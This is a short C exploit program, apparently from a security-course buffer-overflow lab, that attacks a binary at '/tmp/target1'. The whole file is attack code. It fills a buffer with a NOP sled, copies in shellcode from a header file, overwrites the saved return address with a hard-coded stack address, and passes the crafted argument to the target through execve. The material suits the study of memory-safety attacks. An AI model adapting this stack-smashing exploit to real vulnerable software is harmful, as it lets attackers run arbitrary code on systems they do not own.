#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define BUFFER_ADDRESS 0xbffffc28
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  char override[256+4+4+1];
  memset(override,NOP,256);
  memcpy(override+3,shellcode,strlen(shellcode));
  *(int *)(override+260)=BUFFER_ADDRESS;
  memset(override+264,'\0',1);

  args[0] = TARGET;  args[2] = NULL;
  args[1]=override; 
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
